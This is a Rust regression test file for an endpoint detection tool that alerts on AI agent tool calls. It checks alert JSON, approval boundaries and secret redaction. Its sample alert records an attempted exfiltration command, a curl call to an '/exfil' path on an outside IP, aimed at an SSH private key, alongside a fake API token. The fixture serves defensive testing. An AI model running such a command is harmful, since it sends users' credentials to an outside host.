//! Alerting and response model regression tests.

use skynet_edr_core::{
    render_alert_json, Alert, AlertDestination, AlertId, ApprovalBoundary, DetectionRuleId,
    EventSource, RedactionMetadata, ResponseAction, Severity, SourceKind, SECRET_REPLACEMENT,
};

fn sample_source() -> EventSource {
    EventSource {
        kind: SourceKind::McpTool,
        sensor: "mcp-audit".to_owned(),
        integration: Some("hermes-default".to_owned()),
    }
}

fn sample_alert() -> Alert {
    Alert {
        id: AlertId::new("alt_01JPHASE7"),
        created_at_unix_ms: 1_781_477_000_000,
        severity: Severity::Critical,
        rule_id: DetectionRuleId::new("EDR-MCP-001"),
        source: sample_source(),
        origin: "session default/abc123".to_owned(),
        evidence: "tool output included API_TOKEN=fake_token_value_123456 and curl".to_owned(),
        attempted_action: Some("curl https://198.51.100.10/exfil".to_owned()),
        affected_assets: vec!["/home/frederic/.ssh/id_rsa".to_owned()],
        network_destination: Some("198.51.100.10:443".to_owned()),
        action_taken: ResponseAction::RequireApproval,
        recommended_next_steps: vec![
            "Deny the tool call until the operator confirms intent".to_owned(),
            "Rotate any exposed test honeytokens".to_owned(),
        ],
        destinations: vec![
            AlertDestination::Stdout,
            AlertDestination::JsonlFile {
                path: "alerts.jsonl".to_owned(),
            },
            AlertDestination::Webhook {
                name: "soc-webhook".to_owned(),
                url: "https://hooks.example.invalid/skynet".to_owned(),
            },
        ],
        approval_boundary: ApprovalBoundary::OperatorRequired,
        redaction: RedactionMetadata {
            contains_sensitive_data: false,
            redacted_fields: vec![],
        },
    }
}

#[test]
fn alert_schema_serializes_destinations_response_action_and_approval_boundary() {
    let alert = sample_alert();

    let value = serde_json::to_value(alert).expect("alert serializes");

    assert_eq!(value["id"], "alt_01JPHASE7");
    assert_eq!(value["severity"], "critical");
    assert_eq!(value["rule_id"], "EDR-MCP-001");
    assert_eq!(value["destinations"][0]["type"], "stdout");
    assert_eq!(value["destinations"][1]["type"], "jsonl_file");
    assert_eq!(value["destinations"][1]["path"], "alerts.jsonl");
    assert_eq!(value["destinations"][2]["type"], "webhook");
    assert_eq!(value["action_taken"], "require_approval");
    assert_eq!(value["approval_boundary"], "operator_required");
}

#[test]
fn destructive_response_actions_are_inside_approval_boundary() {
    assert!(ApprovalBoundary::OperatorRequired.allows(ResponseAction::RequireApproval));
    assert!(ApprovalBoundary::OperatorRequired.allows(ResponseAction::PauseAutomation));
    assert!(!ApprovalBoundary::PassiveOnly.allows(ResponseAction::PauseAutomation));
    assert!(!ApprovalBoundary::PassiveOnly.allows(ResponseAction::BlockNetworkEgress));
    assert!(ApprovalBoundary::PreApprovedContainment.allows(ResponseAction::BlockNetworkEgress));
}

#[test]
fn rendered_alert_json_redacts_evidence_assets_source_and_destinations() {
    let mut alert = sample_alert();
    alert.source.integration = Some("agent at /home/frederic/workspace".to_owned());
    alert.destinations.push(AlertDestination::Email {
        to: "security@example.invalid".to_owned(),
    });
    alert.destinations.push(AlertDestination::Webhook {
        name: "private hook".to_owned(),
        url: "https://hooks.example.invalid/?token=fake_webhook_token_123456".to_owned(),
    });

    let rendered = render_alert_json(&alert).expect("alert renders to JSON");

    assert!(!rendered.value.contains("fake_token_value_123456"));
    assert!(!rendered.value.contains("fake_webhook_token_123456"));
    assert!(!rendered.value.contains("/home/frederic"));
    assert!(rendered.value.contains(SECRET_REPLACEMENT));
    assert!(rendered.metadata.contains_sensitive_data);

    let value: serde_json::Value =
        serde_json::from_str(&rendered.value).expect("rendered alert is JSON");
    assert_eq!(
        value["evidence"],
        "tool output included API_TOKEN=[REDACTED:secret] and curl"
    );
    assert_eq!(value["affected_assets"][0], "[REDACTED:local_context]");
    assert_eq!(
        value["source"]["integration"],
        "agent at [REDACTED:local_context]"
    );
    assert_eq!(
        value["destinations"][4]["url"],
        "https://hooks.example.invalid/?token=[REDACTED:secret]"
    );
}
